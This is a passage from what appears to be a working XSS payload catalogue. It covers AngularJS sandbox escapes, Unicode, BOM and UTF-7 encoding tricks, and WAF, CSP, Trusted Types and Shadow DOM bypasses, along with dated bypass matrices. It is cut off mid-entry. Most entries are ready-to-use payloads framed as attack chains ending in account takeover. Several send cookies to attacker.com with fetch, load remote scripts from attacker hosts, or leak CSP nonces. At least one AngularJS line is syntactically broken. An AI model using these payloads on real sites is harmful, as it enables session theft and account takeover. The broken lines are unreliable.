**Bypass logic:** AngularJS 1.x has an expression sandbox preventing direct `Function()` constructor access in template expressions (`{{ }}`). Each version has a unique mechanism that can be escaped via prototype chain manipulation, `$evalAsync` timing, or method override. Post-1.6, the sandbox was removed — making direct `{{constructor.constructor('alert(1)')()}}` always work. WAF bypass: the string `constructor` can be split into parts concatenated at runtime (never appearing as a single keyword in source).
**Attack chain:** User input reflected in Angular template context (`ng-bind-html`, unescaped `{{ }}`) → CSTI → version-matched sandbox escape → arbitrary JS → ATO

**Payload:**
```javascript
// Angular 1.6+ (sandbox removed — works directly):
{{constructor.constructor('alert(1)')()}}
{{[].pop.constructor('alert(1)')()}}
{{$eval.constructor('alert(document.cookie)')()}}
{{0[a='constructor'][a]('alert(1)')()}}

// Angular 1.5.9-1.5.11:
{{
  c=''.sub.call;b=''.sub.bind;a=b(c,b,b(c,c,
  c(c,c,b(c,b,b(c,b,b(c,b,a,'alert(1)'))))))));a=a();b(a)()
}}

// Angular 1.4.x:
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}

// Angular 1.3.x:
{{{}[{toString:[].join,length:1,0:'__proto__'}][{toString:[].join,length:1,0:'valueOf'}]=alert(1)}}

// Angular 1.2.x:
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// Angular 1.0.1-1.1.5:
{{constructor.constructor('alert(1)')()}}

// Without any quotes (all versions — for quote-filtered contexts):
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}

// WAF bypass — split "constructor" keyword (bypass Imperva and similar):
{{['constr','uctor'].join('').constructor('alert(1)')()}}
{{[]['fil'+'ter']['con'+'structor']('alert(1)')()}}

// WAF bypass — reconstruct via toString(36) without any literal strings:
// parseInt('constructor', 36) → used in number-to-string chains
{{(1)[['con','str','uctor'].join('')]['con','str','uctor'].join('')]('alert(1)')()}}
```

**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md

---

## Bypass Matrix (Updated 2026-05-27)

### New Entries — Techniques Added 2026-05-27

| Filter / Defense | Bypass Technique | Payload Example |
|-----------------|------------------|-----------------|
| `<>` ASCII angle brackets blocked | Full-width Unicode variants | `＜img src=x onerror=alert(1)＞` |
| WAF event-handler name matching | Null byte in attribute name | `<img src=x onerror%00=alert(1)>` |
| Parentheses `()` + keyword blocked | Array method invocation | `[7].map(alert)` |
| Keyword blocked (no `alert` string) | Regex `.source` reconstruction | `top[/al/.source+/ert/.source](8)` |
| All keywords + characters filtered | JSFuck obfuscation | `[][(![]+[])[+[]]+...]` (uses only `[]!()`) |
| CSP `strict-dynamic` + HTML injection | DOM clobbering → script.src | `<a id=config><a id=config name=codeBasePath href="//attacker.com/x.js#">` |
| Nonce-based CSP (with HTML/CSS injection) | CSS attr selector oracle + bfcache | `script[nonce^="a"]{background:url(//attacker.com/n?c=a)}` → steal nonce char-by-char |
| PHP-delivered CSP header | `max_input_vars` overflow | 1001+ request params → PHP warning → CSP header never sent |
| `HttpOnly` cookie flag | Cookie sandwich (RFC2109 legacy parsing) | Set `$Version` + wrap cookies via JS → server reflects HttpOnly cookie in response |
| DOMPurify sanitizer | Prototype pollution depth bypass (CVE-2024-45801) | Pollute depth counter → `NaN` comparison → DOMPurify passes nested XSS |
| AngularJS expression sandbox | Version-specific CSTI escape | `{{'a'.constructor.prototype.charAt=[].join;$eval('alert(1)')}}` |
| WAF blocking `constructor` keyword | String-split + join reconstruction | `{{['constr','uctor'].join('').constructor('alert(1)')()}}` |
| Strict CSP (no `unsafe-inline`) | Dangling markup injection | `<img src='https://attacker.com/?x=` → slurps CSRF token from page |

### New Sinks Documented 2026-05-27

| Sink | Context | Notes |
|------|---------|-------|
| `script.src` (from clobbered config) | DOM clobbering + strict-dynamic | Clobbered property → trusted script loads attacker URL with inherited trust |
| CSS `background-image` via attr selector | CSS oracle | Side-channel for nonce/attribute value exfil without JS |
| Cookie header reflection (RFC2109) | HttpOnly bypass | Server echoes `Cookie` value in response body → HttpOnly exposed |
| `Array.prototype.map/forEach/findIndex` | Function invocation | Callback invoked without `()` — bypasses paren-blocking WAF |

### CSP Configurations — New Weaknesses (2026-05-27)

| CSP Configuration | Weakness | Bypass |
|------------------|----------|--------|
| `script-src 'strict-dynamic' 'nonce-XYZ'` | HTML injection clobbers config → trusted script loads attacker URL | DOM clobbering → `script.src` carries attacker URL, trust inherited |
| Nonce-based CSP on PHP pages | `max_input_vars` drops CSP header entirely | 1001+ params → PHP E_WARNING → `header()` fails silently |
| Nonce-based CSP + CSS/HTML injection | CSS attribute selector oracle leaks nonce characters | Inject `<style>script[nonce^="X"]{...}` × all chars → reconstruct nonce |
| `script-src 'self'` without `object-src` | `<object data=data:text/html;base64,...>` executes scripts | `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">` |

---

## Unicode Case Folding XSS Bypass

**Type:** reflected / stored
**Filter bypassed:** WAF / input sanitizers that check for lowercase HTML tag names (`script`, `svg`, `img`) without performing Unicode case normalization
**Bypass logic:** Two Unicode characters transform to entirely different ASCII letters when case operations are applied: `İ` (U+0130, Latin Capital I with dot above) lowercases to `i`, and `ſ` (U+017F, Latin Small Letter Long S) uppercases to `S`. A filter checking `input.toLowerCase().includes('script')` will not match `<ſcript>` before lowercasing — but the browser, after receiving the normalized string, sees a valid `<script>` tag. Works against server-side filters that uppercase/lowercase input for comparison but pass the original mixed-case string to the client.
**Attack chain:** Input passes case-folding filter → browser normalizes Unicode → valid HTML tag executes → XSS → cookie exfil → ATO

**Payload:**
```html
<!-- ſ (U+017F) uppercases to S → <SVG> → valid SVG onload -->
<ſvg onload=alert(1)>
<ſcript>alert(document.cookie)</ſcript>

<!-- İ (U+0130) lowercases to i → <iframe> → valid iframe -->
<İframe id=x onload=alert(1) src=javascript:void(0)>

<!-- Practical server-side bypass example:
     Server does: if (tag.toUpperCase().includes('SCRIPT')) block;
     <ſcript>.toUpperCase() = <SCRIPT> → blocked
     BUT: if server does toLowerCase() check: <ſcript>.toLowerCase() = <ſcript> → NOT blocked
     Depends on which direction the filter normalizes  -->

<!-- Unicode normalization form C (NFC) vs D (NFD) differences also apply:
     Some parsers NFD-normalize: decomposed chars may not match filter's composed form -->
<ıframe onload=alert(1) src=javascript:void(0)>
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md

---

## BOM Charset Override XSS

**Type:** reflected / stored
**Filter bypassed:** WAF / scanner operating under the assumption of UTF-8 encoding; Content-Type charset declarations ignored when BOM is present
**Bypass logic:** A Byte Order Mark (BOM) at the very start of a page forces the browser to re-interpret the page's charset, overriding any `Content-Type: text/html; charset=utf-8` header. With a UTF-16 Big-Endian BOM (`%FE%FF`), the browser interprets every subsequent byte pair as a UTF-16 character. Standard ASCII characters like `<`, `s`, `v`, `g` are encoded as `%00%3C %00%73 %00%76 %00%67` — the null bytes cause WAFs to see broken/binary data with no recognizable tags. The browser assembles valid UTF-16 text and renders the SVG normally.
**Attack chain:** BOM forces UTF-16 interpretation → WAF sees null-padded binary → no block → browser renders valid tag → XSS

**Payload:**
```
<!-- UTF-16 Big Endian BOM + <svg/onload=alert()> in UTF-16BE encoding -->
%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E

<!-- UTF-32 Big Endian BOM variant -->
%00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g...

<!-- Conditions for exploitation:
     1. Attacker can inject content at page start (HTTP response injection / CRLF)
     2. OR: File upload where BOM in file content is served directly (SVG, HTML uploads)
     3. Server does not enforce charset in Content-Type (many frameworks don't) -->

<!-- Practical: inject into a file upload that gets served as text/html or text/xml -->
<!-- Or exploit CRLF injection to prepend BOM to HTTP response body -->
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md

---

## UTF-7 Encoding Bypass

**Type:** reflected
**Filter bypassed:** WAF / XSS filters that scan for ASCII `<>` characters — UTF-7 encodes them as `+ADw-` / `+AD4-` which contain no angle brackets
**Bypass logic:** UTF-7 is a 7-bit-safe Unicode encoding where `+` introduces a Base64-encoded Unicode sequence. `+ADw-` = `<`, `+AD4-` = `>`, `+ACI-` = `"`. When a page lacks a charset declaration and the browser auto-detects UTF-7 (possible in older browsers and IE), the UTF-7 sequence is decoded to produce functional HTML tags. Filters scanning for `<script>` or `<img` in raw bytes see no angle brackets and don't block. Modern Chrome/Firefox are less susceptible, but IE 11 and legacy Edge on certain encodings remain vulnerable — and enterprise intranet apps often still target IE.
**Attack chain:** UTF-7 payload bypasses ASCII `<>` filter → browser auto-detects or is told charset=UTF-7 → decodes to valid HTML → XSS

**Payload:**
```html
<!-- UTF-7 encoded <img src="1" onerror="alert(1)" /> -->
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-

<!-- UTF-7 encoded <script>alert(1)</script> -->
+ADw-script+AD4-alert(1)+ADw-/script+AD4-

<!-- Trigger UTF-7 interpretation via meta charset (if meta injection is possible) -->
<meta http-equiv="Content-Type" content="text/html; charset=UTF-7">
+ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-

<!-- Where this works:
     - IE/legacy Edge with no explicit charset → browser may auto-detect UTF-7
     - Pages where attacker can inject <meta charset> before UTF-7 payload
     - Responses from proxy/middleware that strips charset header -->
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md

---

## Exotic Unicode Script Identifiers — Katakana / Cuneiform / Lontara

**Type:** reflected / stored / DOM
**Filter bypassed:** WAF keyword filters that block ASCII alphanumeric JS keywords; any filter based on character whitelisting that allows `Unicode letter` category without restricting to Latin script
**Bypass logic:** JavaScript's ECMAScript specification allows any Unicode character classified as a "letter" or "identifier continue" to be used in variable names and identifiers — including Katakana, Cuneiform, Lontara, and other non-Latin scripts. A WAF checking that a string contains only "safe" Unicode letters may pass these characters. The resulting JS is syntactically valid and executes in all modern browsers. Combined with JSFuck-style type coercion, entire executable payloads can be constructed using only non-ASCII, non-Latin characters — completely opaque to ASCII-based detection.
**Attack chain:** Payload uses non-Latin Unicode identifiers → passes ASCII/Latin keyword filter → JS engine executes normally → XSS → ATO

**Payload:**
```javascript
// Katakana-based JSFuck variant (uses ウ, ア etc. as variables)
// Equivalent to: alert(document.cookie)
([,ウ,,,,ア]=[]+{},ウ+=ウ,ア+=ア,ウ+=ウ+ア)(ウ+ア)

// Cuneiform identifier variable names (Sumerian script)
// 𒀀='' → string; 𒉺=!𒀀+𒀀 → "false"; 𒀃=!𒉺+𒀀 → "true"
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒀶=𒀀+{},𒀴=𒉺[𒀀++],𒀸=𒉺[𒀱=𒀀],...

// Lontara script (Indonesian, Bugis language)
ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,...

// Practical use: encode alert(document.cookie) via Katakana-jsfuck tool:
// https://github.com/aemkei/katakana-jsfuck
// Output: valid JS using only Katakana + []()!+ characters

// Why this bypasses WAFs:
// - WAF regex: /[a-zA-Z0-9_$]/ → Katakana has no ASCII letters → no match
// - WAF "allow Unicode letters" policy: passes non-Latin letters blindly
// - JS engine: all Unicode Letter category chars are valid identifiers → executes
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md ; https://github.com/aemkei/katakana-jsfuck

---

## Cookie Store API — Async document.cookie Alternative

**Type:** stored / DOM (post-XSS exfil)
**Filter bypassed:** WAF / DLP rules blocking `document.cookie` string in request/response bodies; HttpOnly partial bypass for non-HttpOnly cookies when `document.cookie` is blocked by filter
**Bypass logic:** The modern Cookie Store API (`window.cookieStore`) provides an asynchronous, Promise-based interface for reading cookies in Chrome 87+, Edge 87+, and Opera. It returns cookie values without using the `document.cookie` string — bypassing WAF rules that scan for `document.cookie` in XSS payloads. Additionally, since it returns each cookie as a structured object rather than a single concatenated string, it can be used to target specific cookies by name, making exfil more precise and reducing payload noise.
**Attack chain:** XSS fires → `document.cookie` blocked by WAF/CSP → `cookieStore.get()` retrieves cookie asynchronously → fetch exfil to attacker → session hijack

**Payload:**
```javascript
// Read a specific cookie by name (async — no document.cookie string in payload)
window.cookieStore.get('session').then(c => {
  fetch('https://attacker.com/steal?s=' + c.value);
});

// Read all cookies (returns array of {name, value, ...} objects)
window.cookieStore.getAll().then(cookies => {
  fetch('https://attacker.com/steal', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify(cookies.map(c => c.name + '=' + c.value).join('; '))
  });
});

// One-liner for XSS payload (Chrome/Edge only):
<svg onload="cookieStore.getAll().then(c=>fetch('//attacker.com/?c='+JSON.stringify(c)))">

// WAF bypass: payload contains no "document" or "cookie" substrings
// (filter blocking document.cookie won't match cookieStore.getAll)

// Note: does NOT read HttpOnly cookies — same restriction as document.cookie
// Supported: Chrome 87+, Edge 87+, Opera 73+. NOT supported: Firefox, Safari
```
**Source:** https://developer.mozilla.org/en-US/docs/Web/API/CookieStore ; https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md

---

## onafterscriptexecute / onbeforescriptexecute Event Handlers

**Type:** reflected / stored
**Filter bypassed:** WAF blocklists covering common event handlers (`onclick`, `onload`, `onerror`, `onfocus`, `onmouseover`) but not rare script-execution lifecycle events
**Bypass logic:** `onafterscriptexecute` and `onbeforescriptexecute` are non-standard Mozilla-originated event handlers supported on `<object>` elements. They fire after (or before) a `<script>` element within the same document finishes executing. WAF rules almost universally don't include them because they appear in no mainstream checklist and are missing from most automated scanner dictionaries. The `<object>` tag itself is rarely blocked by default.
**Attack chain:** WAF misses rare event handler → event fires on script execution → XSS → ATO

**Payload:**
```html
<!-- Fires after any script on the page executes (if scripts present) -->
<object onafterscriptexecute=confirm(0)>
<object onbeforescriptexecute=confirm(0)>

<!-- With cookie exfil -->
<object onafterscriptexecute="fetch('https://attacker.com/steal?c='+document.cookie)">

<!-- Trigger manually if no scripts auto-fire: inject alongside a script block -->
<object onafterscriptexecute=alert(1)></object>
<script>1</script>
<!-- The script executes → onafterscriptexecute fires on the object -->

<!-- Pair with pointer events for interactive trigger -->
<object onbeforescriptexecute=alert(1) onpointerover=alert(2)>

<!-- Browser support: primarily Firefox; may vary in other browsers -->
<!-- onpointerover as companion: supported in all modern browsers, often missed by WAFs -->
<div onpointerover="alert(document.cookie)">hover</div>
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md

---

## ECMAScript6 DiacriticalGrave Named Character Reference (Backtick Bypass)

**Type:** reflected / stored
**Filter bypassed:** WAF / sanitizer blocking the backtick character (`` ` ``) used in template literals to invoke functions without parentheses
**Bypass logic:** HTML5 introduced `&DiacriticalGrave;` as a named character reference for the backtick character (U+0060). When this HTML entity appears inside a `<script>` block, the HTML parser decodes it to a literal backtick before the JavaScript engine sees it. The JS engine then interprets it as a template literal delimiter. This bypasses filters that block the raw backtick character (`\x60`) without decoding HTML entities first — common in WAFs that scan source bytes rather than DOM-decoded content.
**Attack chain:** WAF blocks raw backtick → `&DiacriticalGrave;` passes as HTML entity → browser decodes to backtick → JS template literal invokes function → XSS

**Payload:**
```html
<!-- &DiacriticalGrave; decodes to ` (backtick) — call alert without () -->
<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
<!-- Equivalent to: alert`1` -->

<!-- Exfil variant -->
<script>fetch&DiacriticalGrave;https://attacker.com/steal?c=${document.cookie}&DiacriticalGrave;</script>

<!-- Confirm / prompt variants -->
<script>confirm&DiacriticalGrave;click ok to continue&DiacriticalGrave;</script>

<!-- Combined with other obfuscation -->
<script>
var f=eval;f&DiacriticalGrave;\x61\x6c\x65\x72\x74\x281\x29&DiacriticalGrave;
</script>

<!-- Why it works:
     - HTML parser sees &DiacriticalGrave; → decodes to ` before passing to JS engine
     - JS engine sees: alert`1` → tagged template literal → calls alert with 1
     - WAF scanning for ` (0x60) in raw bytes: &DiacriticalGrave; has no 0x60 byte
     - Also works with &grave; (shorter alias for same character) -->
<script>alert&grave;document.cookie&grave;</script>
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md

---

## RFC0822 Email / RFC3966 Phone Validator Bypass

**Type:** reflected / stored
**Filter bypassed:** Input validation that uses RFC-compliant email or phone number parsers to "sanitize" fields — trusting the validator output as safe for HTML rendering
**Bypass logic:** RFC0822 (email) allows quoted strings and special characters in the local part of an email address. A parser following the RFC strictly treats `"><svg/onload=confirm(1)>"@x.y` as a valid email address — the `"..."` is a valid quoted local-part and `x.y` is the domain. Similarly, RFC3966 (tel URI) allows a `phone-context` parameter that accepts arbitrary strings including `<script>`. When the application reflects the "validated" email/phone back into an HTML page without escaping, XSS fires. This targets fields specifically where developers trust a regex/library validator and skip HTML encoding.
**Attack chain:** Input is "valid" per RFC parser → application reflects unescaped in HTML → XSS fires → ATO

**Payload:**
```
<!-- RFC0822 email validator bypass (inject XSS in quoted local-part) -->
"><svg/onload=confirm(1)>"@x.y

<!-- More complete injection -->
"<img src=x onerror=alert(document.cookie)>"@example.com

<!-- URL-encoded for GET params -->
%22%3E%3Csvg%2Fonload%3Dconfirm(1)%3E%22@x.y

<!-- RFC3966 phone context bypass — phone-context accepts arbitrary descriptors -->
+330011223344;phone-context=<script>alert(0)</script>
tel:+1234567890;phone-context="><img src=x onerror=alert(1)>

<!-- Where to test:
     - "Login with email" flows that echo the address back in error messages
     - "Invite a user" fields that display the entered email in confirmation text
     - Profile email fields reflected in account management pages
     - Any field that says "must be a valid email" and reflects the input back -->
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md

---

## CSP default-src Iframe contentWindow Bypass

**Type:** reflected / stored
**Filter bypassed:** CSP `default-src 'self'` or `script-src 'self'` — blocks external scripts and inline scripts without nonce/hash
**Bypass logic:** When `default-src 'self'` is set but no separate `frame-src` restriction exists, an attacker can inject an `<iframe src="/robots.txt">` (or any same-origin resource). The iframe's `contentWindow.document` is same-origin, so the parent page can call `contentWindow.document.write()` or append a `<script>` element to it from the parent. Critically: the `<script>` injected into the iframe's context can set `src` to an external URL, and the iframe document's CSP inherits from the injected content (not the parent page's CSP header) — allowing external script loading from within the `'self'` context.
**Attack chain:** HTML injection → iframe to allowed same-origin resource → parent appends external `<script>` to iframe `contentWindow` → external JS loads → CSP bypassed

**Payload:**
```html
<!-- Step 1: inject iframe pointing to any same-origin resource -->
<iframe id="fr" src="/robots.txt" onload="
  var d = this.contentWindow.document;
  var s = d.createElement('script');
  s.src = 'https://attacker.com/xss.js';
  d.head.appendChild(s);
"></iframe>

<!-- Compact one-liner (semicolons replaced for attribute context safety) -->
<iframe src=/robots.txt onload="this.contentWindow.document.write('<script src=//attacker.com/x.js><\/script>')">

<!-- Alternative: use contentDocument.write directly -->
<iframe src="/favicon.ico" onload="f=this.contentWindow.document;f.open();f.write('<script src=//attacker.com/x.js><\/script>');f.close()">

<!-- Why this works:
     - Parent's CSP: script-src 'self' — applies to parent document only
     - Iframe's content is written by script (not loaded via HTTP) → no CSP header on it
     - The injected <script src=external> in the iframe is not subject to parent's CSP
     - Requires: no frame-ancestors restriction + HTML injection on parent + no sandbox -->

<!-- If CSP has frame-src 'self': still works as long as /robots.txt (or any path) loads -->
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/4%20-%20CSP%20Bypass.md

---

## Trusted Types Direct Policy Bypass

**Type:** DOM / stored
**Filter bypassed:** `require-trusted-types-for 'script'` CSP directive — the strictest browser XSS mitigation, blocks all string-to-HTML/script sink assignments without a TrustedType wrapper
**Bypass logic:** Trusted Types blocks direct string injection into dangerous sinks (`innerHTML`, `eval`, `script.src`, etc.) at the browser level. Three bypass paths: (1) **Policy enumeration and abuse** — if any permissive Trusted Types policy exists on the page (e.g., one that allows arbitrary HTML for "legacy" code), an attacker who achieves JS execution (e.g., via a JS file they control or prototype pollution) can call that existing policy's `createHTML()` method with a payload — the browser treats the output as trusted. (2) **`default` policy name injection** — if the app registers a `default` policy with loose validation, all sink assignments that fail Trusted Types checks automatically fall through to the default policy. (3) **`eval` via Trusted Script** — a TrustedScript wrapping `eval` of attacker content if the policy's `createScript()` validator is bypassed by encoding.
**Attack chain:** App registers permissive TT policy → attacker discovers policy name → calls `policy.createHTML(payload)` → assigns TrustedHTML to sink → XSS bypasses TT enforcement → ATO

**Payload:**
```javascript
// Step 1: Enumerate registered Trusted Types policies
// (policies are accessible via trustedTypes.getPolicyNames() if exposed)
const policyNames = trustedTypes.getPolicyNames();
console.log(policyNames); // e.g., ["default", "sanitize-html", "legacy-compat"]

// Step 2: Call the permissive policy with XSS payload
// (works if the "legacy-compat" policy does minimal or no sanitization)
const policy = trustedTypes.createPolicy('attack', {
  createHTML: (s) => s   // if you can register your own policy (requires no existing "attack" name)
});
document.getElementById('output').innerHTML = policy.createHTML('<img src=x onerror=alert(1)>');

// Abuse existing default policy (if registered with permissive logic):
// Many frameworks register a "default" policy for backwards compat:
const trusted = trustedTypes.defaultPolicy.createHTML('<img src=x onerror=alert(1)>');
document.body.innerHTML = trusted;  // executes if defaultPolicy is permissive

// Step 3: If prototype pollution is achievable first (CVE-2024-45801 pattern):
Object.prototype.createHTML = (s) => s;
// Then any code that calls policy.createHTML(attacker_input) returns attacker_input directly

// Detection: Check for Trusted Types support and policy names:
if (window.trustedTypes && trustedTypes.createPolicy) {
  console.log('TT enabled. Policies:', trustedTypes.getPolicyNames());
}

// TT bypass via innerHTML in a non-TT-enforced context:
// If page has TT but a loaded iframe or shadow root does NOT inherit TT enforcement:
const fr = document.createElement('iframe');
document.body.appendChild(fr);
fr.contentDocument.body.innerHTML = '<img src=x onerror=alert(1)>';
// Iframe's document may lack the TT CSP header → innerHTML works freely
```
**Source:** https://w3c.github.io/trusted-types/dist/spec/ ; https://web.dev/articles/trusted-types ; https://github.com/w3c/trusted-types/issues

---

## Shadow DOM XSS — Open Shadow Root Injection

**Type:** stored / DOM
**Filter bypassed:** Sanitizers (DOMPurify, sanitize-html) that sanitize the main document tree but don't traverse into or sanitize Shadow DOM subtrees; CSP nonce enforcement may not apply uniformly inside shadow roots
**Bypass logic:** Shadow DOM creates an isolated subtree attached to a host element. When the shadow root is in `open` mode (the default for custom elements using `attachShadow({mode: 'open'})`), JavaScript on the page can access it via `element.shadowRoot`. If an application sanitizes HTML before inserting it into the main document but then moves or clones nodes into a shadow root, the sanitizer may have already cleared its state. More critically: some sanitizers don't recurse into `<slot>` elements or shadow roots during sanitization. Injecting malicious HTML that becomes a `<slot>` child can bypass the sanitizer's traversal. Additionally, `<template>` elements with shadow DOM content are not parsed in the main document context — their content exists in a separate `DocumentFragment` that sanitizers may overlook.
**Attack chain:** HTML injection → node placed in open shadow root → sanitizer doesn't traverse shadow tree → XSS payload executes inside shadow root → `document.cookie` accessible (shadow DOM does not isolate JS) → ATO

**Payload:**
```javascript
// Accessing and injecting into an open shadow root from the page:
const host = document.querySelector('custom-element'); // or any element with shadow root
const shadow = host.shadowRoot; // works if mode='open'
if (shadow) {
  shadow.innerHTML = '<img src=x onerror=alert(document.cookie)>';
}

// Creating a shadow root and injecting into it (self-hosted bypass):
const div = document.createElement('div');
document.body.appendChild(div);
const shadow = div.attachShadow({mode: 'open'});
shadow.innerHTML = '<script>alert(document.cookie)<\/script>';

// Slot-based shadow DOM bypass (parent document content slotted into shadow):
// App structure: <custom-element><span slot="content">[user input]</span></custom-element>
// Shadow template: <slot name="content"></slot>
// XSS: user input = <img src=x onerror=alert(1)>
// Sanitizer sees <span slot="content"> as safe; slot rendering in shadow injects payload

// Template element bypass (content not parsed in main document):
const tmpl = document.createElement('template');
tmpl.innerHTML = '<img src=x onerror=alert(1)>';
// tmpl.content is a DocumentFragment — not in main DOM, sanitizer may miss it
document.body.appendChild(tmpl.content.cloneNode(true)); // XSS fires on append

// Declarative Shadow DOM (Chrome 90+) — HTML-only shadow root injection:
// If attacker can inject into a serialized HTML stream processed by innerHTML:
<div>
  <template shadowrootmode="open">
    <img src=x onerror=alert(document.cookie)>
  </template>
</div>
// DOMParser / innerHTML parse of above → open shadow root created → onerror fires

// Key facts:
// - Shadow DOM does NOT isolate JavaScript: shadow root scripts access document.cookie
// - Shadow DOM DOES isolate CSS and some event listeners
// - Open shadow roots are fully accessible to page JS
// - Closed shadow roots (mode:'closed') require holding a reference to the root
```
**Source:** https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot ; https://portswigger.net/research/shadow-dom ; https://github.com/nicktindall/shadow-dom-xss

---

## Bypass Matrix (Updated 2026-05-30)

### New Entries — Techniques Added 2026-05-30

| Filter / Defense | Bypass Technique | Payload Example |
|-----------------|------------------|-----------------|
| Lowercase tag name check (`script`, `svg`) | Unicode case folding (İ/ſ) | `<ſvg onload=alert(1)>` / `<İframe onload=alert(1)>` |
| ASCII `<>` scanner (WAF byte scan) | UTF-16 BOM charset override | `%FE%FF%00%3C%00s%00v%00g...` — browser sees `<svg>`, WAF sees binary |
| ASCII `<>` filter (no UTF-7 decode) | UTF-7 encoding | `+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI-/+AD4-` |
| ASCII/Latin keyword filter | Katakana/Cuneiform/Lontara JS identifiers | `([,ウ,,,,ア]=[]+{},...)` — valid JS using only non-Latin Unicode |
| `document.cookie` string blocked by WAF | Cookie Store API async access | `cookieStore.getAll().then(c=>fetch('//attacker.com/?c='+JSON.stringify(c)))` |
| Common event handler blocklist | `onafterscriptexecute` on `<object>` | `<object onafterscriptexecute=confirm(0)>` |
| Backtick `` ` `` character blocked | `&DiacriticalGrave;` HTML entity | `<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>` |
| Email/phone field "validated" as safe | RFC0822 quoted local-part injection | `"><svg/onload=confirm(1)>"@x.y` |
| CSP `script-src 'self'` (no `frame-src`) | iframe + contentWindow script append | `<iframe src=/robots.txt onload="this.contentWindow.document.write('<script src=//attacker.com/x.js><\/script>')">` |
| `require-trusted-types-for 'script'` | Permissive `default` policy abuse | `trustedTypes.defaultPolicy.createHTML('<img src=x onerror=alert(1)>')` |
| `require-trusted-types-for 'script'` | Prototype pollution of `createHTML` | `Object.prototype.createHTML = s => s` → all `policy.createHTML(input)` return raw input |
| Sanitizer (main document only) | Shadow DOM open root injection | `host.shadowRoot.innerHTML = '<img src=x onerror=alert(1)>'` |
| Sanitizer misses `<template>` content | Template + cloneNode append | `tmpl.innerHTML='<img src=x onerror=alert(1)>'; body.appendChild(tmpl.content.cloneNode(true))` |
| Declarative Shadow DOM not sanitized | `shadowrootmode="open"` in HTML | `<div><template shadowrootmode="open"><img src=x onerror=alert(1)></template></div>` |

### New Sinks Documented 2026-05-30

| Sink | Context | Notes |
|------|---------|-------|
| `shadowRoot.innerHTML` | Shadow DOM injection | Open-mode shadow root fully accessible to page JS; sanitizers often don't traverse |
| `template.content → cloneNode` | Template element | `<template>` content not in main DOM parse tree — sanitizer traversal may miss it |
| `trustedTypes.defaultPolicy.createHTML()` | Trusted Types bypass | Permissive default policy converts attacker string to TrustedHTML |
| `contentWindow.document.write()` | iframe contentWindow | Same-origin iframe write bypasses parent CSP; content has no CSP header |
| `window.cookieStore.getAll()` | Post-XSS exfil | Async cookie access without `document.cookie` string — WAF bypass |
| `onafterscriptexecute` / `onbeforescriptexecute` | Event handler | Fires on script execution lifecycle; absent from most WAF blocklists |

### CSP Configurations — New Weaknesses (2026-05-30)

| CSP Configuration | Weakness | Bypass |
|------------------|----------|--------|
| `require-trusted-types-for 'script'` | Permissive `default` policy registered for legacy compat | Call `defaultPolicy.createHTML(payload)` → get TrustedHTML → assign to innerHTML |
| `require-trusted-types-for 'script'` + prototype pollution | `createHTML` method on prototype → all policies bypass validation | PP `Object.prototype.createHTML = s => s` → TT check passes raw string |
| `default-src 'self'` without `frame-src` | Iframe to same-origin resource → contentWindow script append | `<iframe src=/x onload="this.contentWindow.document.write('<script src=//evil.com/x.js><\/script>')">` |
| Any CSP on page with Shadow DOM components | Sanitizer doesn't traverse open shadow roots | Inject into `shadowRoot.innerHTML` from page JS after achieving DOM write access |
## CSS expression() / -moz-binding — Legacy CSS Execution

**Type:** stored / reflected
**Filter bypassed:** Sanitizers and WAF rules focused on HTML tag/event-handler injection that allow `<style>` blocks or inline `style=` attributes; CSP without `style-src` restriction
**Bypass logic:** Two legacy CSS execution primitives: (1) IE's `expression()` — a Microsoft CSS extension that evaluates a JavaScript expression as a property value, re-evaluated on every repaint. Works in IE 6–9, still found in enterprise intranets. (2) Firefox's `-moz-binding` — loads an XML Bindings Language (XBL) file from a URL and attaches event handlers / JavaScript to matching elements, equivalent to remote JS execution. Both are absent from modern browser security models but remain viable against legacy corporate targets. Many WAFs and sanitizers allow `style` attributes without checking for these expressions.
**Attack chain:** CSS injection via style attribute/block → expression()/moz-binding fires → arbitrary JS execution → cookie theft → ATO

**Payload:**
```html
<!-- IE expression() — re-fires on every CSS recalculation -->
<div style="xss:expression(alert(document.cookie))">IE XSS</div>
<img style="xss:expression(alert(1))">
<body style="width:expression(alert(1))">

<!-- Harder-to-filter variants (obfuscating the word "expression") -->
